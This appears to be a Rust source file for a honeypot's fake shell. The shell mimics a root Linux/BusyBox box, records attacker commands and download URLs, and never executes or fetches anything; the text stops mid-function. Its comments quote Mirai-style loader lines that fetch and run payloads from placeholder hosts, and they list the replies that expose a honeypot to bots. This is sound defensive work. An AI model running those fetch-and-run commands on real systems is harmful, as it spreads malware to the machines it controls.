//! The fake interactive shell (Task 13) presented to an attacker after SSH authentication
//! succeeds. Originally part of `sensor-ssh`; moved here (Task 1 of the remaining-sensors plan)
//! so `sensor-telnet`/`sensor-adb` can reuse it without depending on sensor-ssh. See "Fake
//! shell", "Never-exec", and "No attacker-directed fetch" in
//! `internal/design/02-sensor-framework.md`: this module sits on the two highest-priority
//! security surfaces in the platform, and both governing invariants are enforced by
//! construction, not by care.
//!
//! **Never-exec.** No file in this crate's `src/`, nor in `sensor-ssh`'s, imports a
//! process-spawning facility: no `Command` type pulled in from `std`'s `process` module, no
//! `exec`-family call, no dynamic evaluation of any kind. Every command below returns a
//! hand-written, static or lightly-interpolated string; there is no code path from an
//! attacker-typed byte to a real shell, syscall, or interpreter. `never_exec_static_check` in
//! `sensor-ssh`'s `tests/shell_test.rs` asserts this at the source level (as plain substring
//! matches, so this doc comment is deliberately phrased to describe those APIs without spelling
//! out their exact paths) across every file in both crates' `src/`, not just this one.
//!
//! **No attacker-directed fetch.** `wget`/`curl` return a canned transcript and perform zero
//! network I/O. This is guaranteed the same way never-exec is: this crate (and the whole
//! workspace) depends on no HTTP or generic network-fetch client, so there is nothing present
//! capable of making the request even if a future change tried to. `tests/shell_test.rs`'s
//! `workspace_lockfile_has_no_http_client_crate` asserts the fully-resolved workspace lockfile
//! names none; Task 14's `no_outbound_connection` integration test verifies the same thing at
//! runtime, across a live session.
//!
//! Every attacker-controlled byte this module embeds in a `SensorEvent` clears
//! `sensor_framework::sanitize_value` first - the same chokepoint `auth.rs` and `channel.rs`
//! route through - so a command line can never forge a second wire record via an embedded CR/LF
//! or ANSI escape.

use std::net::IpAddr;

use sensor_wire::{
    PROTO_TCP, SIGNAL_HONEYPOT_COMMAND_EXEC, SIGNAL_HONEYPOT_FILE_DOWNLOAD, SensorEvent,
    WIRE_VERSION,
};

use crate::command_codec::CommandCodec;
use crate::fakefs::FakeFs;
use crate::persona;
use crate::sanitize_value;

/// Cap applied to the sanitized command line captured in `metadata.command`. Matches
/// `auth::MAX_METADATA_STRING_LEN`'s convention of a generous, fixed bound on an
/// attacker-controlled string entering an event.
const MAX_COMMAND_LEN: usize = 1024;

/// Cap applied to the `wget`/`curl` target URL echoed back in canned output. Smaller than
/// `MAX_COMMAND_LEN` since it is one token of the line, not the whole line.
const MAX_URL_LEN: usize = 512;

/// The per-session facts every `honeypot_command_exec` event carries, handed in once at shell
/// construction. Mirrors `auth::AuthState`'s "real parameters, no placeholder" convention:
/// `source_ip`/`wan_ip` are this connection's real attributes. `authenticated` is read from here
/// rather than hardcoded `true` - the shell is only ever reached post-authentication in practice,
/// but a future caller (a pre-auth probe, a non-interactive path) must not have its events
/// silently mis-tagged by a hardcoded value.
///
/// `protocol_label` exists because this shell is shared across protocols (SSH, Telnet, and per
/// the design spec eventually ADB): it names both the emitted event's top-level `sensor` field
/// and its `metadata.protocol_label` entry, so `handle_input` never hardcodes which sensor is
/// driving it. Every current and planned caller uses the same string for both - there is no
/// observed case where a `FakeShell` consumer's `sensor` name differs from its `protocol_label` -
/// so one field covers both rather than two that would only ever be set identically.
pub struct EmitContext {
    pub source_ip: IpAddr,
    pub wan_ip: Option<IpAddr>,
    pub authenticated: bool,
    pub protocol_label: String,
    pub session_id: Option<uuid::Uuid>,
}

/// Per-session ceiling on `honeypot_command_exec` events. A real interactive attacker runs a
/// bounded kill chain (tens of commands); an unbounded stream is a flood - one IP produced >20k
/// command events by streaming binary over the channel. Past this, the shell keeps responding but
/// stops appending per-line events (one marker is emitted at the boundary), so a single session
/// cannot pollute the append-only ledger without bound.
const MAX_COMMANDS_PER_SESSION: u64 = 256;

/// The fake interactive shell. One instance per SSH session; `cwd` is the only mutable state,
/// tracking a `cd` across calls the way a real shell would.
pub struct FakeShell {
    fs: FakeFs,
    ctx: EmitContext,
    cwd: String,
    /// Per-session de-obfuscation for XOR-encoded command probes (see `command_codec`).
    codec: CommandCodec,
    /// Count of input lines this session (whether or not each produced an event); drives the flood
    /// cap.
    command_count: u64,
    /// Whether the one-per-session binary-flood marker has been emitted.
    binary_flagged: bool,
    /// Whether the one-per-session command-cap marker has been emitted.
    cap_flagged: bool,
}

impl FakeShell {
    pub fn new(fs: FakeFs, ctx: EmitContext) -> Self {
        Self {
            fs,
            ctx,
            cwd: "/root".to_string(),
            codec: CommandCodec::new(),
            command_count: 0,
            binary_flagged: false,
            cap_flagged: false,
        }
    }

    /// Encode outbound bytes with the session's locked obfuscation key (identity when the session is
    /// plaintext). The sensor calls this on its assembled response so a symmetric-codec bot reads
    /// plaintext after de-obfuscating.
    pub fn encode_output(&self, bytes: &[u8]) -> Vec<u8> {
        self.codec.encode(bytes)
    }

    /// Handle one line of shell input: capture it as a `honeypot_command_exec` event (unless the
    /// line is blank - see below), then return the canned terminal output for a recognized
    /// command, or a `command not found` message for anything else.
    ///
    /// A blank line (empty or whitespace-only) produces neither output nor an event. A bare
    /// keystroke or a terminal keepalive is not "a command" by any real shell's definition, and
    /// counting one would pad `honeypot_command_exec` telemetry with empty-command noise on
    /// every idle newline a client sends. This is the one place this function departs from
    /// "every call captures exactly one event" - called out here since it is the one behavior in
    /// this module not dictated directly by the interface.
    pub fn handle_input(&mut self, line: &str) -> (String, Vec<SensorEvent>) {
        if line.trim().is_empty() {
            return (String::new(), Vec::new());
        }

        // Decode a single-byte-XOR-obfuscated probe (identity for plaintext). The event records the
        // RAW line verbatim - the hash chain must see exactly what crossed the wire - while the
        // decoded form and key are annotated alongside so the grammar can respond and an analyst can
        // read it. Dispatch and URL capture run on the DECODED line.
        let (decoded, key) = self.codec.decode(line);
        self.command_count += 1;

        // Two floods must never pollute the append-only ledger with one event per line: a
        // binary/non-text line (an SSH/telnet channel tunneling binary, or a fuzzer - not a
        // command), and an unbounded stream of commands from one session (a single IP produced
        // >20k `command_exec` events this way). In both cases we STILL dispatch below so the fake
        // shell keeps responding - a silently dead session is itself a tell - but emit at most ONE
        // marker event per session per flood kind rather than one event per garbage line.
        let events = if is_binary_line(&decoded) {
            if std::mem::replace(&mut self.binary_flagged, true) {
                Vec::new()
            } else {
                vec![self.command_event(serde_json::json!({
                    "protocol_label": self.ctx.protocol_label,
                    "command": "<binary channel data; per-line command events suppressed>",
                    "flood": "binary",
                }))]
            }
        } else if self.command_count > MAX_COMMANDS_PER_SESSION {
            if std::mem::replace(&mut self.cap_flagged, true) {
                Vec::new()
            } else {
                vec![self.command_event(serde_json::json!({
                    "protocol_label": self.ctx.protocol_label,
                    "command": format!(
                        "<per-session command cap of {MAX_COMMANDS_PER_SESSION} reached; further commands suppressed>"
                    ),
                    "flood": "command_cap",
                }))]
            }
        } else {
            // Normal command: the event records the RAW line verbatim (the hash chain must see
            // exactly what crossed the wire); the decoded form and XOR key are annotated alongside.
            let mut metadata = serde_json::json!({
                "protocol_label": self.ctx.protocol_label,
                "command": sanitize_value(line, MAX_COMMAND_LEN),
            });
            if let Some(k) = key
                && let Some(obj) = metadata.as_object_mut()
            {
                obj.insert(
                    "command_decoded".to_string(),
                    serde_json::json!(sanitize_value(&decoded, MAX_COMMAND_LEN)),
                );
                obj.insert("xor_key".to_string(), serde_json::json!(k));
            }
            let mut evs = vec![self.command_event(metadata)];
            for url in download_targets(&decoded) {
                let sanitized_url = sanitize_value(&url, MAX_URL_LEN);
                evs.push(SensorEvent {
                    v: WIRE_VERSION,
                    source_ip: self.ctx.source_ip,
                    wan_ip: self.ctx.wan_ip,
                    sensor: self.ctx.protocol_label.clone(),
                    signal_type: SIGNAL_HONEYPOT_FILE_DOWNLOAD.into(),
                    protocol: PROTO_TCP.into(),
                    authenticated: self.ctx.authenticated,
                    observed_at: chrono::Utc::now(),
                    metadata: serde_json::json!({
                        "protocol_label": self.ctx.protocol_label,
                        "url": sanitized_url,
                    }),
                    sample: None,
                    session_id: self.ctx.session_id,
                    occurrence_id: None,
                });
            }
            evs
        };

        let output = self.run_line(&decoded);
        (output, events)
    }

    /// Run one decoded input line the way a shell reads it: each simple command in order, with
    /// `&&` and `||` short-circuiting on the previous command's outcome and `;`, `&` and a
    /// newline just sequencing. A pipeline stays one command answered by its first stage, and
    /// quotes are not parsed; this is a response grammar, not an interpreter. Dispatching the
    /// whole line as one command answered a loader's gate line `ls /home; /bin/busybox BOTNET`
    /// with "ls: cannot access '/home;'" and never ran the busybox probe, so the bot never got
    /// the "applet not found" reply it waits for and left before its download stage (observed
    /// live 2026-09-06).
    fn run_line(&mut self, decoded: &str) -> String {
        let mut out = String::new();
        let mut last_ok = true;
        for (op, segment) in control_segments(decoded) {
            let run = match op {
                ControlOp::Seq => true,
                ControlOp::And => last_ok,
                ControlOp::Or => !last_ok,
            };
            if !run {
                continue;
            }
            let parts: Vec<&str> = segment.split_whitespace().collect();
            if parts.is_empty() {
                continue;
            }
            let reply = match redirection_only_target(&parts) {
                Some(target) => self.redirection_only(target),
                None => self.dispatch(&parts),
            };
            last_ok = !looks_like_failure(&reply);
            out.push_str(&reply);
        }
        out
    }

    /// `> path` with no command is a real command: it opens the file for writing and prints
    /// nothing. Loaders probe for a writable directory this way, chaining `>/var/run/.x && cd
    /// /var/run` across a list of candidates, and the probe must succeed exactly where the box
    /// would let it (the directory exists) and fail with the shell's own message where it does
    /// not, or the `&&` after it runs in the wrong places. Dispatching `>/var/run/.x` as a
    /// command name answered "command not found", failed every probe, and the chain never
    /// reached the busybox marker the loader keys its next stage on (observed live 2026-09-06).
    fn redirection_only(&mut self, target: &str) -> String {
        let resolved = self.resolve_path(target);
        match self.fs.create_file(&resolved) {
            Ok(()) => String::new(),
            Err(_) => format!("bash: {resolved}: No such file or directory\n"),
        }
    }

    /// Build a `honeypot_command_exec` event carrying `metadata`, stamped from the session context.
    /// Shared by the normal-command path and the two flood-marker paths.
    fn command_event(&self, metadata: serde_json::Value) -> SensorEvent {
        SensorEvent {
            v: WIRE_VERSION,
            source_ip: self.ctx.source_ip,
            wan_ip: self.ctx.wan_ip,
            sensor: self.ctx.protocol_label.clone(),
            signal_type: SIGNAL_HONEYPOT_COMMAND_EXEC.into(),
            protocol: PROTO_TCP.into(),
            authenticated: self.ctx.authenticated,
            observed_at: chrono::Utc::now(),
            metadata,
            sample: None,
            session_id: self.ctx.session_id,
            occurrence_id: None,
        }
    }

    /// Produce the canned terminal output for one already-tokenized, non-empty command line.
    /// Every arm returns a static or lightly-interpolated string; none evaluates, spawns, or
    /// otherwise interprets `parts` as code - see the module doc.
    fn dispatch(&mut self, parts: &[&str]) -> String {
        // Match on the command's basename, so a full path (`/bin/busybox`, `/userfs/bin/wget`,
        // `/bin/sh`) - which IoT loaders routinely use - resolves to the same applet a bare invocation
        // would, the way a real shell finds it on PATH. Only the command token is normalised;
        // arguments are untouched.
        let cmd = parts.first().map(|p| command_basename(p));
        match cmd {
            Some("uname") => cmd_uname(parts),
            Some("id") => "uid=0(root) gid=0(root) groups=0(root)\n".to_string(),
            Some("whoami") => "root\n".to_string(),
            Some("pwd") => format!("{}\n", self.cwd),
            Some("echo") => cmd_echo(&parts[1..]),
            Some("cat") => self.cmd_cat(parts),
            Some("ls") => self.cmd_ls(parts),
            Some("wget") => cmd_wget(parts),
            Some("curl") => cmd_curl(parts),
            Some("ping") => cmd_ping(parts),
            // Shell-availability fingerprint: every real system has /bin/sh, so "command not found"
            // for sh/bash instantly outs the honeypot and the dropper leaves. Model a nested shell.
            // `ash` is BusyBox's shell and appears in the applet list, so it resolves here too.
            Some("sh") | Some("bash") | Some("ash") => self.cmd_shell_spawn(parts),
            // The canonical Mirai/Gafgyt probe is `/bin/busybox <TOKEN>`, which they confirm by the
            // exact "<TOKEN>: applet not found" reply; they also fetch payloads via `busybox wget`
            // and `busybox tftp`.
            Some("busybox") => self.cmd_busybox(parts),
            // tftp/ftpget are BusyBox download applets these loaders use; stay quiet (a real
            // non-interactive fetch prints nothing on success) rather than "command not found". The
            // target URL is captured by `download_target` above.
            Some("tftp") | Some("ftpget") => String::new(),
            // Filesystem/no-output applets in a loader's drop chain (`chmod +x x`, then `cp`/`rm`/
            // `mkdir`/`sleep`). A real shell prints nothing on success, and "command not found" for
            // `chmod` is impossible on any real Linux - it outs the honeypot before the loader ever
            // executes its payload, costing the capture - so model them as silent successes.
            Some("chmod") | Some("cp") | Some("rm") | Some("mkdir") | Some("sleep") => {
                String::new()
            }
            Some("cd") => {
                // Only into a directory the box presents: a silent `cd` into a directory that
                // `ls /` never showed is a tell, and a loader's `>/x/.x && cd /x` chain relies on
                // the two agreeing about what exists.
                let target = self.resolve_path(first_non_flag_arg(&parts[1..]).unwrap_or("/root"));
                if self.fs.is_dir(&target) {
                    self.cwd = target;
                    String::new()
                } else {
                    format!("bash: cd: {target}: No such file or directory\n")
                }
            }
            // Already root on this box, so `su` (and `su -`, `su root`) opens another shell
            // silently, prompt unchanged; "command not found" would be a tell on any Linux.
            Some("su") => String::new(),
            Some("exit") | Some("logout") => String::new(),
            // An interactive bash on Ubuntu prefixes the message with its own name; the bare form
            // matched no real shell.
            Some(other) => format!("bash: {other}: command not found\n"),
            None => String::new(),
        }
    }

    /// Resolve `arg` to an absolute path: returned as-is if it already starts with `/`, otherwise
    /// joined onto `cwd`. Minimal - no `.`/`..` normalisation - which is enough for the canned FS
    /// and the relative reads (`cd /proc && cat self/cmdline`) attackers actually use.
    fn resolve_path(&self, arg: &str) -> String {
        if arg.starts_with('/') {
            arg.to_string()
        } else {
            format!("{}/{arg}", self.cwd.trim_end_matches('/'))
        }
    }

    fn cmd_cat(&self, parts: &[&str]) -> String {
        match first_non_flag_arg(&parts[1..]) {
            Some(path) => {
                let resolved = self.resolve_path(path);
                // /proc/self is the reading process (`cat`), so /proc/self/cmdline is its own argv,
                // NUL-separated with a trailing NUL and no newline - exactly as the kernel returns
                // it. A missing one ("No such file or directory") is a classic honeypot tell some
                // Mirai/Gafgyt loaders check before delivering a payload.
                if resolved == "/proc/self/cmdline" {
                    let mut out = parts.join("\0");
                    out.push('\0');
                    return out;
                }
                self.fs
                    .read_file(&resolved)
                    .unwrap_or_else(|| format!("cat: {path}: No such file or directory\n"))
            }
            None => String::new(),
        }
    }

    fn cmd_ls(&self, parts: &[&str]) -> String {
        let target = first_non_flag_arg(&parts[1..]).unwrap_or(self.cwd.as_str());
        match self.fs.list_dir(target) {
            Some(entries) if entries.is_empty() => String::new(),
            Some(entries) => entries.join("  ") + "\n",
            None => format!("ls: cannot access '{target}': No such file or directory\n"),
        }
    }

    /// `sh` / `bash`. A nested interactive shell just drops the caller at a new prompt, so a bare
    /// invocation is a no-op that keeps the session in this fake shell (never "command not found").
    /// `sh -c "CMD"` runs CMD in the fake shell, since loaders stage their payload that way.
    fn cmd_shell_spawn(&mut self, parts: &[&str]) -> String {
        let script = parts
            .iter()
            .position(|&p| p == "-c")
            .and_then(|pos| parts.get(pos + 1));
        if let Some(script) = script {
            let inner = strip_one_quote_pair(script);
            let inner_parts: Vec<&str> = inner.split_whitespace().collect();
            if !inner_parts.is_empty() {
                return self.dispatch(&inner_parts);
            }
        }
        String::new()
    }

    /// `busybox`. Bare invocation prints the multi-call banner. `busybox <applet> ...` runs the
    /// applet if it is one this shell models, else returns BusyBox's exact "<applet>: applet not
    /// found" - the reply Mirai/Gafgyt check for to confirm a real busybox before delivering.
    fn cmd_busybox(&mut self, parts: &[&str]) -> String {
        match parts.get(1).copied() {
            None => busybox_banner(),
            Some(applet) if is_busybox_applet(applet) => self.dispatch(&parts[1..]),
            Some(applet) => format!("{applet}: applet not found\n"),
        }
    }
}

/// The command token with any leading path stripped (`/bin/busybox` -> `busybox`), so a full-path
/// invocation resolves the way a real shell finds a command on PATH. Shared by [`FakeShell::dispatch`]
/// and [`download_target`] so they agree on what a command is; without this the two drift and a
/// full-path fetch answers in-persona while its download evidence is silently dropped.
/// A line dominated by non-printable-ASCII characters is a binary flood (an SSH/telnet channel
/// tunneling binary, or a fuzzer), not a shell command. `String::from_utf8_lossy` turns invalid
/// bytes into U+FFFD, and high bytes that do not form valid UTF-8 land there too, so a genuine
/// binary stream is mostly non-printable while a real command is ~all printable ASCII. A `> 30%`
/// non-printable ratio flags the former without catching an ordinary command carrying a stray byte.
fn is_binary_line(s: &str) -> bool {
    let total = s.chars().count();
    if total == 0 {
        return false;
    }
    let nonprintable = s
        .chars()
        .filter(|&c| c != '\t' && !(' '..='~').contains(&c))
        .count();
    nonprintable * 100 / total > 30
}

fn command_basename(token: &str) -> &str {
    token.rsplit('/').next().unwrap_or(token)
}

/// The download target of a fetch command, or `None` if the line is not one. Covers the direct
/// fetchers and the BusyBox forms (`busybox wget URL`, `busybox tftp ...`) IoT loaders favour, so
/// the `honeypot_file_download` event fires for those too - not only a bare `wget`/`curl`.
///
/// `wget`/`curl` take a URL token, returned as-is. `tftp` and `ftpget` take a HOST and a FILE as
/// separate arguments with no scheme, so the URL is synthesized (`tftp://host/file`,
/// `ftp://host/file`): recording just the first non-flag token - which was the host for one flag
/// order and the filename for another - produced a scheme-less fragment the fetcher could not
/// parse, so a Mirai loader's `tftp -g HOST -r FILE` was logged and then silently never fetched.
///
/// The top-level command token is basename-resolved like `dispatch`, so `/bin/busybox tftp ...` is
/// captured. The busybox *applet* token is matched raw, exactly like `cmd_busybox`/`is_busybox_applet`
/// do: real busybox resolves an applet by bare name only, so `busybox /bin/tftp` is "applet not
/// found" and must not be recorded as a fetch the persona did not answer in character.
fn download_target(parts: &[&str]) -> Option<String> {
    const FETCHERS: [&str; 4] = ["wget", "curl", "tftp", "ftpget"];
    // BusyBox ships wget/tftp/ftpget applets but NOT curl, so `busybox curl` is "applet not found"
    // (see BUSYBOX_APPLETS) and must not be recorded as a fetch the persona did not answer in
    // character - the same principle the full-path `busybox /bin/tftp` case relies on.
    const BUSYBOX_FETCHERS: [&str; 3] = ["wget", "tftp", "ftpget"];
    let (cmd, args) = match parts.first().map(|c| command_basename(c)) {
        Some(cmd) if FETCHERS.contains(&cmd) => (cmd, &parts[1..]),
        Some("busybox") if parts.get(1).is_some_and(|a| BUSYBOX_FETCHERS.contains(a)) => {
            (parts[1], &parts[2..])
        }
        _ => return None,
    };
    match cmd {
        "tftp" => tftp_url(args),
        "ftpget" => ftpget_url(args),
        _ => fetch_url_arg(cmd, args).map(str::to_string),
    }
}

/// The URL argument of a `wget`/`curl` invocation. A token carrying a scheme wins outright,
/// whatever its position. Failing that, the first positional that is not the VALUE of an option:
/// `wget -q -O 1.sh http://h/1.sh` names its output file before the URL, and a parser that only
/// skips dash-prefixed tokens returned `1.sh` as the download - a bare filename the fetcher could
/// never retrieve (observed live 2026-09-03 on a Mirai loader line). Only the options that take a
/// separate value are consumed; a value attached to its flag (`-O-`, `-qO-`, `-o1.sh`) is not.
fn fetch_url_arg<'a>(cmd: &str, args: &[&'a str]) -> Option<&'a str> {
    if let Some(url) = args.iter().find(|a| a.contains("://")) {
        return Some(url);
    }
    // Short options that take the next token as their value. Everything else is a bare switch.
    let short_with_value: &[char] = match cmd {
        "wget" => &['O', 'o', 'P', 'T', 't', 'U', 'w', 'a', 'i', 'B', 'e'],
        _ => &[
            'o', 'H', 'd', 'A', 'X', 'u', 'm', 'e', 'x', 'T', 'b', 'c', 'K', 'w',
        ],
    };
    let mut it = args.iter();
    while let Some(&a) = it.next() {
        if let Some(long) = a.strip_prefix("--") {
            // `--output=x` carries its value; `--output x` does not.
            if !long.contains('=') && LONG_OPTIONS_WITH_VALUE.contains(&long) {
                it.next();
            }
        } else if let Some(cluster) = a.strip_prefix('-')
            && !cluster.is_empty()
        {
            // In a cluster like `-qO`, a value-taking letter with nothing after it consumes the
            // next token; with characters after it (`-qO-`, `-so1.sh`) the value is attached.
            let mut chars = cluster.chars();
            while let Some(c) = chars.next() {
                if short_with_value.contains(&c) {
                    if chars.as_str().is_empty() {
                        it.next();
                    }
                    break;
                }
            }
        } else {
            return Some(a);
        }
    }
    None
}

const LONG_OPTIONS_WITH_VALUE: [&str; 18] = [
    "output-document",
    "output-file",
    "directory-prefix",
    "timeout",
    "tries",
    "user-agent",
    "wait",
    "header",
    "post-data",
    "output",
    "data",
    "request",
    "user",
    "max-time",
    "referer",
    "proxy",
    "upload-file",
    "cookie",
];

/// The distinct URLs a line retrieves, in order of first appearance. A loader line is rarely one
/// simple command: Mirai wraps every fetcher in a `( a || busybox a ) > f; chmod ...` fallback
/// chain, so the fetch verb is never the line's first token, and a whole-line `download_target`
/// saw `(tftp` and dropped the retrieval (observed live 2026-09-02: the wget line of that chain
/// was captured only because the raw-line scan found its `http://`). Each simple command is
/// examined on its own; the fallback pair `wget X || busybox wget X` names one URL and yields
/// one event. The raw-line scheme scan stays as the last resort for a URL inside quotes
/// (`sh -c "wget http://h/x; ..."`), where the separators belong to a quoted script.
fn download_targets(decoded: &str) -> Vec<String> {
    let mut urls: Vec<String> = Vec::new();
    for tokens in simple_commands(decoded) {
        if let Some(url) = download_target(&tokens)
            && !urls.contains(&url)
        {
            urls.push(url);
        }
    }
    if urls.is_empty()
        && let Some(url) = url_if_fetch_line(decoded)
    {
        urls.push(url.to_string());
    }
    urls
}

/// Split a line into its simple commands' token lists at `;`, `|`, `||`, `&&`, a background `&`,
/// `(`, `)`, backticks and newlines, cutting each command at its first redirection (`> t`,
/// `2>&1`, `< x`) since a redirection target is not an argument. A `&` inside a URL query
/// (`?a=1&b=2`) is not a separator. Quotes are not honoured: the split serves URL capture, not
/// execution, and a URL never contains a bare separator.
fn simple_commands(line: &str) -> Vec<Vec<&str>> {
    let bytes = line.as_bytes();
    let mut segments = Vec::new();
    let mut start = 0;
    for (i, &b) in bytes.iter().enumerate() {
        let is_sep = match b {
            b';' | b'|' | b'(' | b')' | b'`' | b'\n' => true,
            b'&' => bytes
                .get(i + 1)
                .is_none_or(|&n| n == b'&' || n.is_ascii_whitespace()),
            _ => false,
        };
        if is_sep {
            segments.push(&line[start..i]);
            start = i + 1;
        }
    }
    segments.push(&line[start..]);
    segments
        .into_iter()
        .map(|seg| {
            seg.split_whitespace()
                .take_while(|t| !is_redirection(t))
                .collect::<Vec<_>>()
        })
        .filter(|tokens| !tokens.is_empty())
        .collect()
}

fn is_redirection(token: &str) -> bool {
    let t = token.trim_start_matches(|c: char| c.is_ascii_digit());
    t.starts_with('>') || t.starts_with('<')
}

/// The control operator that precedes a segment of an input line, deciding whether it runs.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ControlOp {
    /// `;`, a background `&`, a newline, or the start of the line: run unconditionally.
    Seq,
    /// `&&`: run only if the previous command succeeded.
    And,
    /// `||`: run only if the previous command failed.
    Or,
}

/// Split an input line at its control operators for EXECUTION, unlike `simple_commands`, which
/// splits more aggressively for URL capture. `;`, `&&`, `||`, a background `&` (one not followed
/// by another `&` or a non-space, so a URL query's `&b=2` survives) and a newline separate
/// commands; `|`, parentheses and backticks do not, so a pipeline is dispatched as one command
/// by its first stage. Each segment is paired with the operator that introduced it.
fn control_segments(line: &str) -> Vec<(ControlOp, &str)> {
    let bytes = line.as_bytes();
    let mut segments = Vec::new();
    let mut start = 0;
    let mut op = ControlOp::Seq;
    let mut i = 0;
    while i < bytes.len() {
        let (sep_len, next_op) = match bytes[i] {
            b';' | b'\n' => (1, ControlOp::Seq),
            b'&' if bytes.get(i + 1) == Some(&b'&') => (2, ControlOp::And),
            b'&' if bytes.get(i + 1).is_none_or(|n| n.is_ascii_whitespace()) => (1, ControlOp::Seq),
            b'|' if bytes.get(i + 1) == Some(&b'|') => (2, ControlOp::Or),
            _ => {
                i += 1;
                continue;
            }
        };
        segments.push((op, &line[start..i]));
        op = next_op;
        i += sep_len;
        start = i;
    }
    segments.push((op, &line[start..]));
    segments
}

/// If `parts` is a command made only of output redirections (`>/tmp/.x`, `> /tmp/.x`,
/// `>>/tmp/.x`, `1>/tmp/.x`), the file they write. Any ordinary word makes it a normal command
/// and `None` is returned; an input-only redirection (`</etc/passwd`) reads nothing and is not
/// modeled here either.
fn redirection_only_target<'a>(parts: &[&'a str]) -> Option<&'a str> {
    let mut target = None;
    let mut i = 0;
    while i < parts.len() {
        let tok = parts[i];
        let stripped = tok.trim_start_matches(|c: char| c.is_ascii_digit());
        if !stripped.starts_with('>') {
            return None;
        }
        let attached = stripped.trim_start_matches('>');
        let file = if attached.is_empty() {
            i += 1;
            *parts.get(i)?
        } else {
            attached
        };
        target.get_or_insert(file);
        i += 1;
    }
    target
}

/// Whether a canned reply reads as a failed command, for `&&`/`||` sequencing. A real shell has
/// an exit status; this grammar has only its output, so the failure vocabulary the grammar
/// itself emits stands in for it.
fn looks_like_failure(reply: &str) -> bool {
    reply.contains("not found")
        || reply.contains("No such file")
        || reply.contains("cannot access")
        || reply.contains("Permission denied")
}

/// `tftp [-g|-p] [-l LOCAL] [-r REMOTE] HOST [PORT]` (BusyBox) -> `tftp://HOST[:PORT]/REMOTE`.
/// `-r`/`-l` consume the next token; other flags do not. Flag order varies between loaders
/// (`-g -r FILE HOST` and `-g HOST -r FILE` are both common), so positionals are collected rather
/// than indexed. With only `-l` given, BusyBox uses it as the remote name too. No host -> `None`;
/// a host with no file still yields `tftp://HOST`, since the retrieval host is evidence on its own.
fn tftp_url(args: &[&str]) -> Option<String> {
    let mut remote = None;
    let mut local = None;
    let mut positional = Vec::new();
    let mut it = args.iter();
    while let Some(&a) = it.next() {
        match a {
            "-r" => remote = it.next().copied(),
            "-l" => local = it.next().copied(),
            _ if a.starts_with('-') => {}
            _ => positional.push(a),
        }
    }
    let host = *positional.first()?;
    let port = positional.get(1);
    let file = remote.or(local);
    Some(join_fetch_url("tftp", host, port.copied(), file))
}

/// `ftpget [-c] [-v] [-u USER] [-p PASS] [-P PORT] HOST [LOCAL] REMOTE` (BusyBox) ->
/// `ftp://HOST[:PORT]/REMOTE`. `-u`/`-p`/`-P` consume the next token. The remote name is the LAST
/// positional whenever at least two are present (`HOST REMOTE` or `HOST LOCAL REMOTE`). The
/// fetcher does not retrieve `ftp://` (unsupported scheme, by design), but the retrieval attempt is
/// still recorded accurately rather than as a bare host.
fn ftpget_url(args: &[&str]) -> Option<String> {
    let mut port = None;
    let mut positional = Vec::new();
    let mut it = args.iter();
    while let Some(&a) = it.next() {
        match a {
            "-u" | "-p" => {
                it.next();
            }
            "-P" => port = it.next().copied(),
            _ if a.starts_with('-') => {}
            _ => positional.push(a),
        }
    }
    let host = *positional.first()?;
    let file = if positional.len() >= 2 {
        positional.last().copied()
    } else {
        None
    };
    Some(join_fetch_url("ftp", host, port, file))
}

fn join_fetch_url(scheme: &str, host: &str, port: Option<&str>, file: Option<&str>) -> String {
    let mut url = format!("{scheme}://{host}");
    if let Some(p) = port {
        url.push(':');
        url.push_str(p);
    }
    if let Some(f) = file {
        url.push('/');
        url.push_str(f.trim_start_matches('/'));
    }
    url
}

/// Recover a download URL from a command line that a fetch command hides from token-level parsing -
/// most importantly `sh -c "wget http://h/x; chmod +x x; ./x"`, where the whitespace tokenizer
/// splits the quoted script apart. Only fires when a fetch verb is present, then returns the first
/// `http(s)://`/`tftp://`/`ftp://` token, so an ordinary `echo http://...` is not miscounted as a
/// download.
fn url_if_fetch_line(line: &str) -> Option<&str> {
    if !["wget", "curl", "tftp", "ftpget"]
        .iter()
        .any(|v| line.contains(v))
    {
        return None;
    }
    for scheme in ["http://", "https://", "tftp://", "ftp://"] {
        if let Some(start) = line.find(scheme) {
            let rest = &line[start..];
            let end = rest
                .find(|c: char| {
                    c.is_whitespace() || matches!(c, '"' | '\'' | ';' | '|' | '`' | '&')
                })
                .unwrap_or(rest.len());
            return Some(&rest[..end]);
        }
    }
    None
}

/// The BusyBox applets this shell models - the SINGLE source of truth for both the multi-call banner
/// and `busybox <applet>` dispatch, so the advertised list can never contradict what the shell
/// actually answers. Advertising an applet the same shell then rejects with "applet not found" was a
/// clean two-command honeypot classifier. Notable exclusions: `curl` (real BusyBox ships no curl
/// applet, so `busybox curl` correctly returns "applet not found") and `cd` (a shell builtin, not an
/// applet). Every entry here is handled by [`FakeShell::dispatch`] when invoked bare, so
/// `busybox <applet>` never falls through to "command not found".
const BUSYBOX_APPLETS: &[&str] = &[
    "ash", "cat", "chmod", "cp", "echo", "ftpget", "id", "ls", "mkdir", "ping", "pwd", "rm", "sh",
    "sleep", "tftp", "uname", "wget", "whoami",
];

/// True if `name` is one of the applets this shell models (see [`BUSYBOX_APPLETS`]); anything else
/// returns BusyBox's "applet not found" - the reply Mirai/Gafgyt check to confirm a real busybox.
fn is_busybox_applet(name: &str) -> bool {
    BUSYBOX_APPLETS.contains(&name)
}

/// The BusyBox multi-call banner printed by a bare `busybox`. The applet list is rendered from the
/// one [`BUSYBOX_APPLETS`] source, so it can never advertise an applet the shell then rejects.
/// Loaders key off the "applet not found" reply, not this exact text.
fn busybox_banner() -> String {
    let mut s = String::from(
        "BusyBox v1.31.1 (2021-06-01 00:00:00 UTC) multi-call binary.\n\
         BusyBox is copyrighted by many authors between 1998-2015.\n\
         \n\
         Usage: busybox [function [arguments]...]\n\
         \n\
         Currently defined functions:\n",
    );
    for (idx, chunk) in BUSYBOX_APPLETS.chunks(8).enumerate() {
        if idx > 0 {
            s.push('\n');
        }
        s.push('\t');
        s.push_str(&chunk.join(", "));
    }
    s.push('\n');
    s
}

/// `uname` with real per-flag field selection. Each flag adds its field and the selected fields
/// print in coreutils' fixed order (kernel-name, nodename, kernel-release, kernel-version, machine,
/// processor, hardware-platform, operating-system); a bare `uname` prints the kernel name only, and
/// `-a` the full canonical line. The previous shortcut - ANY flag returned the whole `uname -a`
/// line - was a one-probe fingerprint (real `uname -m` prints only `x86_64`) that also fed IoT
/// loaders a garbage machine string and broke their architecture-based payload selection. Fields
/// come from persona so `uname` cannot disagree with /etc/os-release or the prompt.
fn cmd_uname(parts: &[&str]) -> String {
    let host = persona::hostname();
    let (
